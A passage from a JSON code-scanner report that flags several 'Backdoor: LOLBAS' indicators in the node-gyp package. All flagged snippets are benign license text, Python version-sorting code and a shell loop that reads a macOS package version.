                    "rendered": {
                      "text": "      the copyright owner. For the purposes of this definition, \"submitted\"\n      means any form of electronic, verbal, or written communication sent\n      to the Licensor or its representatives, including but not limited to\n      communication on electronic mailing lists, source code control systems,\n      and issue tracking systems that are managed by, or on behalf of, the\n      Licensor for the purpose of discussing and improving the Work, but\n      excluding communication that is conspicuously marked or otherwise\n",
                      "markdown": "`      the copyright owner. For the purposes of this definition, \"submitted\"\n      means any form of electronic, verbal, or written communication sent\n      to the Licensor or its representatives, including but not limited to\n      communication on electronic mailing lists, source code control systems,\n      and issue tracking systems that are managed by, or on behalf of, the\n      Licensor for the purpose of discussing and improving the Work, but\n      excluding communication that is conspicuously marked or otherwise\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/packaging/LICENSE.APACHE"
                },
                "region": {
                  "startLine": 18,
                  "startColumn": 5,
                  "endLine": 18,
                  "endColumn": 14,
                  "snippet": {
                    "text": "\n      \"Legal Entity\" shall mean the union of the acting entity and all\n      other entities that control, are controlled by, or are under common\n      control with that entity. For the purposes of this definition,\n      \"control\" means (i) the power, direct or indirect, to cause the\n      direction or management of such entity, whether by contract or\n      otherwise, or (ii) ownership of fifty percent (50%) or more of the\n",
                    "rendered": {
                      "text": "\n      \"Legal Entity\" shall mean the union of the acting entity and all\n      other entities that control, are controlled by, or are under common\n      control with that entity. For the purposes of this definition,\n      \"control\" means (i) the power, direct or indirect, to cause the\n      direction or management of such entity, whether by contract or\n      otherwise, or (ii) ownership of fifty percent (50%) or more of the\n",
                      "markdown": "`\n      \"Legal Entity\" shall mean the union of the acting entity and all\n      other entities that control, are controlled by, or are under common\n      control with that entity. For the purposes of this definition,\n      \"control\" means (i) the power, direct or indirect, to cause the\n      direction or management of such entity, whether by contract or\n      otherwise, or (ii) ownership of fifty percent (50%) or more of the\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/packaging/LICENSE.APACHE"
                },
                "region": {
                  "startLine": 140,
                  "startColumn": 24,
                  "endLine": 140,
                  "endColumn": 33,
                  "snippet": {
                    "text": "      with Licensor regarding such Contributions.\n\n   6. Trademarks. This License does not grant permission to use the trade\n      names, trademarks, service marks, or product names of the Licensor,\n      except as required for reasonable and customary use in describing the\n      origin of the Work and reproducing the content of the NOTICE file.\n\n",
                    "rendered": {
                      "text": "      with Licensor regarding such Contributions.\n\n   6. Trademarks. This License does not grant permission to use the trade\n      names, trademarks, service marks, or product names of the Licensor,\n      except as required for reasonable and customary use in describing the\n      origin of the Work and reproducing the content of the NOTICE file.\n\n",
                      "markdown": "`      with Licensor regarding such Contributions.\n\n   6. Trademarks. This License does not grant permission to use the trade\n      names, trademarks, service marks, or product names of the Licensor,\n      except as required for reasonable and customary use in describing the\n      origin of the Work and reproducing the content of the NOTICE file.\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/packaging/version.py"
                },
                "region": {
                  "startLine": 150,
                  "startColumn": 27,
                  "endLine": 150,
                  "endColumn": 31,
                  "snippet": {
                    "text": "\"\"\"\nA string containing the regular expression used to match a valid version.\n\nThe pattern is not anchored at either end, and is intended for embedding in larger\nexpressions (for example, matching a version number as part of a file name). The\nregular expression should be compiled with the ``re.VERBOSE`` and ``re.IGNORECASE``\nflags set.\n",
                    "rendered": {
                      "text": "\"\"\"\nA string containing the regular expression used to match a valid version.\n\nThe pattern is not anchored at either end, and is intended for embedding in larger\nexpressions (for example, matching a version number as part of a file name). The\nregular expression should be compiled with the ``re.VERBOSE`` and ``re.IGNORECASE``\nflags set.\n",
                      "markdown": "`\"\"\"\nA string containing the regular expression used to match a valid version.\n\nThe pattern is not anchored at either end, and is intended for embedding in larger\nexpressions (for example, matching a version number as part of a file name). The\nregular expression should be compiled with the ``re.VERBOSE`` and ``re.IGNORECASE``\nflags set.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/packaging/version.py"
                },
                "region": {
                  "startLine": 557,
                  "startColumn": 28,
                  "endLine": 557,
                  "endColumn": 34,
                  "snippet": {
                    "text": "        # - Alpha numeric segments sort before numeric segments\n        # - Alpha numeric segments sort lexicographically\n        # - Numeric segments sort numerically\n        # - Shorter versions sort before longer versions when the prefixes\n        #   match exactly\n        _local = tuple(\n            (i, \"\") if isinstance(i, int) else (NegativeInfinity, i) for i in local\n",
                    "rendered": {
                      "text": "        # - Alpha numeric segments sort before numeric segments\n        # - Alpha numeric segments sort lexicographically\n        # - Numeric segments sort numerically\n        # - Shorter versions sort before longer versions when the prefixes\n        #   match exactly\n        _local = tuple(\n            (i, \"\") if isinstance(i, int) else (NegativeInfinity, i) for i in local\n",
                      "markdown": "`        # - Alpha numeric segments sort before numeric segments\n        # - Alpha numeric segments sort lexicographically\n        # - Numeric segments sort numerically\n        # - Shorter versions sort before longer versions when the prefixes\n        #   match exactly\n        _local = tuple(\n            (i, \"\") if isinstance(i, int) else (NegativeInfinity, i) for i in local\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/packaging/version.py"
                },
                "region": {
                  "startLine": 556,
                  "startColumn": 28,
                  "endLine": 556,
                  "endColumn": 34,
                  "snippet": {
                    "text": "        # the sorting rules in PEP440.\n        # - Alpha numeric segments sort before numeric segments\n        # - Alpha numeric segments sort lexicographically\n        # - Numeric segments sort numerically\n        # - Shorter versions sort before longer versions when the prefixes\n        #   match exactly\n        _local = tuple(\n",
                    "rendered": {
                      "text": "        # the sorting rules in PEP440.\n        # - Alpha numeric segments sort before numeric segments\n        # - Alpha numeric segments sort lexicographically\n        # - Numeric segments sort numerically\n        # - Shorter versions sort before longer versions when the prefixes\n        #   match exactly\n        _local = tuple(\n",
                      "markdown": "`        # the sorting rules in PEP440.\n        # - Alpha numeric segments sort before numeric segments\n        # - Alpha numeric segments sort lexicographically\n        # - Numeric segments sort numerically\n        # - Shorter versions sort before longer versions when the prefixes\n        #   match exactly\n        _local = tuple(\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/packaging/version.py"
                },
                "region": {
                  "startLine": 555,
                  "startColumn": 34,
                  "endLine": 555,
                  "endColumn": 40,
                  "snippet": {
                    "text": "        # Versions with a local segment need that segment parsed to implement\n        # the sorting rules in PEP440.\n        # - Alpha numeric segments sort before numeric segments\n        # - Alpha numeric segments sort lexicographically\n        # - Numeric segments sort numerically\n        # - Shorter versions sort before longer versions when the prefixes\n        #   match exactly\n",
                    "rendered": {
                      "text": "        # Versions with a local segment need that segment parsed to implement\n        # the sorting rules in PEP440.\n        # - Alpha numeric segments sort before numeric segments\n        # - Alpha numeric segments sort lexicographically\n        # - Numeric segments sort numerically\n        # - Shorter versions sort before longer versions when the prefixes\n        #   match exactly\n",
                      "markdown": "`        # Versions with a local segment need that segment parsed to implement\n        # the sorting rules in PEP440.\n        # - Alpha numeric segments sort before numeric segments\n        # - Alpha numeric segments sort lexicographically\n        # - Numeric segments sort numerically\n        # - Shorter versions sort before longer versions when the prefixes\n        #   match exactly\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/packaging/version.py"
                },
                "region": {
                  "startLine": 554,
                  "startColumn": 34,
                  "endLine": 554,
                  "endColumn": 40,
                  "snippet": {
                    "text": "    else:\n        # Versions with a local segment need that segment parsed to implement\n        # the sorting rules in PEP440.\n        # - Alpha numeric segments sort before numeric segments\n        # - Alpha numeric segments sort lexicographically\n        # - Numeric segments sort numerically\n        # - Shorter versions sort before longer versions when the prefixes\n",
                    "rendered": {
                      "text": "    else:\n        # Versions with a local segment need that segment parsed to implement\n        # the sorting rules in PEP440.\n        # - Alpha numeric segments sort before numeric segments\n        # - Alpha numeric segments sort lexicographically\n        # - Numeric segments sort numerically\n        # - Shorter versions sort before longer versions when the prefixes\n",
                      "markdown": "`    else:\n        # Versions with a local segment need that segment parsed to implement\n        # the sorting rules in PEP440.\n        # - Alpha numeric segments sort before numeric segments\n        # - Alpha numeric segments sort lexicographically\n        # - Numeric segments sort numerically\n        # - Shorter versions sort before longer versions when the prefixes\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/packaging/version.py"
                },
                "region": {
                  "startLine": 549,
                  "startColumn": 49,
                  "endLine": 549,
                  "endColumn": 55,
                  "snippet": {
                    "text": "        _dev = dev\n\n    if local is None:\n        # Versions without a local segment should sort before those with one.\n        _local: CmpLocalType = NegativeInfinity\n    else:\n        # Versions with a local segment need that segment parsed to implement\n",
                    "rendered": {
                      "text": "        _dev = dev\n\n    if local is None:\n        # Versions without a local segment should sort before those with one.\n        _local: CmpLocalType = NegativeInfinity\n    else:\n        # Versions with a local segment need that segment parsed to implement\n",
                      "markdown": "`        _dev = dev\n\n    if local is None:\n        # Versions without a local segment should sort before those with one.\n        _local: CmpLocalType = NegativeInfinity\n    else:\n        # Versions with a local segment need that segment parsed to implement\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/packaging/version.py"
                },
                "region": {
                  "startLine": 541,
                  "startColumn": 51,
                  "endLine": 541,
                  "endColumn": 57,
                  "snippet": {
                    "text": "    else:\n        _post = post\n\n    # Versions without a development segment should sort after those with one.\n    if dev is None:\n        _dev: CmpPrePostDevType = Infinity\n\n",
                    "rendered": {
                      "text": "    else:\n        _post = post\n\n    # Versions without a development segment should sort after those with one.\n    if dev is None:\n        _dev: CmpPrePostDevType = Infinity\n\n",
                      "markdown": "`    else:\n        _post = post\n\n    # Versions without a development segment should sort after those with one.\n    if dev is None:\n        _dev: CmpPrePostDevType = Infinity\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/packaging/version.py"
                },
                "region": {
                  "startLine": 534,
                  "startColumn": 44,
                  "endLine": 534,
                  "endColumn": 50,
                  "snippet": {
                    "text": "    else:\n        _pre = pre\n\n    # Versions without a post segment should sort before those with one.\n    if post is None:\n        _post: CmpPrePostDevType = NegativeInfinity\n\n",
                    "rendered": {
                      "text": "    else:\n        _pre = pre\n\n    # Versions without a post segment should sort before those with one.\n    if post is None:\n        _post: CmpPrePostDevType = NegativeInfinity\n\n",
                      "markdown": "`    else:\n        _pre = pre\n\n    # Versions without a post segment should sort before those with one.\n    if post is None:\n        _post: CmpPrePostDevType = NegativeInfinity\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/packaging/version.py"
                },
                "region": {
                  "startLine": 527,
                  "startColumn": 67,
                  "endLine": 527,
                  "endColumn": 73,
                  "snippet": {
                    "text": "    # the normal sorting rules will handle this case correctly.\n    if pre is None and post is None and dev is not None:\n        _pre: CmpPrePostDevType = NegativeInfinity\n    # Versions without a pre-release (except as noted above) should sort after\n    # those with one.\n    elif pre is None:\n        _pre = Infinity\n",
                    "rendered": {
                      "text": "    # the normal sorting rules will handle this case correctly.\n    if pre is None and post is None and dev is not None:\n        _pre: CmpPrePostDevType = NegativeInfinity\n    # Versions without a pre-release (except as noted above) should sort after\n    # those with one.\n    elif pre is None:\n        _pre = Infinity\n",
                      "markdown": "`    # the normal sorting rules will handle this case correctly.\n    if pre is None and post is None and dev is not None:\n        _pre: CmpPrePostDevType = NegativeInfinity\n    # Versions without a pre-release (except as noted above) should sort after\n    # those with one.\n    elif pre is None:\n        _pre = Infinity\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/packaging/version.py"
                },
                "region": {
                  "startLine": 75,
                  "startColumn": 16,
                  "endLine": 75,
                  "endColumn": 22,
                  "snippet": {
                    "text": "\n    # Please keep the duplicated `isinstance` check\n    # in the six comparisons hereunder\n    # unless you find a way to avoid adding overhead function calls.\n    def __lt__(self, other: \"_BaseVersion\") -> bool:\n        if not isinstance(other, _BaseVersion):\n            return NotImplemented\n",
                    "rendered": {
                      "text": "\n    # Please keep the duplicated `isinstance` check\n    # in the six comparisons hereunder\n    # unless you find a way to avoid adding overhead function calls.\n    def __lt__(self, other: \"_BaseVersion\") -> bool:\n        if not isinstance(other, _BaseVersion):\n            return NotImplemented\n",
                      "markdown": "`\n    # Please keep the duplicated `isinstance` check\n    # in the six comparisons hereunder\n    # unless you find a way to avoid adding overhead function calls.\n    def __lt__(self, other: \"_BaseVersion\") -> bool:\n        if not isinstance(other, _BaseVersion):\n            return NotImplemented\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/macOS_Catalina_acid_test.sh"
                },
                "region": {
                  "startLine": 12,
                  "startColumn": 47,
                  "endLine": 12,
                  "endColumn": 52,
                  "snippet": {
                    "text": "for pkg in \"${pkgs[@]}\"; do\n  output=$(/usr/sbin/pkgutil --pkg-info \"$pkg\" 2>/dev/null)\n  if [ \"$output\" ]; then\n    version=$(echo \"$output\" | grep 'version' | cut -d' ' -f2)\n    break\n  fi\ndone\n",
                    "rendered": {
                      "text": "for pkg in \"${pkgs[@]}\"; do\n  output=$(/usr/sbin/pkgutil --pkg-info \"$pkg\" 2>/dev/null)\n  if [ \"$output\" ]; then\n    version=$(echo \"$output\" | grep 'version' | cut -d' ' -f2)\n    break\n  fi\ndone\n",
                      "markdown": "`for pkg in \"${pkgs[@]}\"; do\n  output=$(/usr/sbin/pkgutil --pkg-info \"$pkg\" 2>/dev/null)\n  if [ \"$output\" ]; then\n    version=$(echo \"$output\" | grep 'version' | cut -d' ' -f2)\n    break\n  fi\ndone\n`"
                    }
                  },
                  "sourceLanguage": "shellscript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/macOS_Catalina_acid_test.sh"
                },
                "region": {
                  "startLine": 12,
                  "startColumn": 30,
                  "endLine": 12,
                  "endColumn": 36,
                  "snippet": {
                    "text": "for pkg in \"${pkgs[@]}\"; do\n  output=$(/usr/sbin/pkgutil --pkg-info \"$pkg\" 2>/dev/null)\n  if [ \"$output\" ]; then\n    version=$(echo \"$output\" | grep 'version' | cut -d' ' -f2)\n    break\n  fi\ndone\n",
                    "rendered": {
                      "text": "for pkg in \"${pkgs[@]}\"; do\n  output=$(/usr/sbin/pkgutil --pkg-info \"$pkg\" 2>/dev/null)\n  if [ \"$output\" ]; then\n    version=$(echo \"$output\" | grep 'version' | cut -d' ' -f2)\n    break\n  fi\ndone\n",
                      "markdown": "`for pkg in \"${pkgs[@]}\"; do\n  output=$(/usr/sbin/pkgutil --pkg-info \"$pkg\" 2>/dev/null)\n  if [ \"$output\" ]; then\n    version=$(echo \"$output\" | grep 'version' | cut -d' ' -f2)\n    break\n  fi\ndone\n`"
                    }
                  },
                  "sourceLanguage": "shellscript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        }
      ],
      "columnKind": "utf16CodeUnits"
    }
  ]
}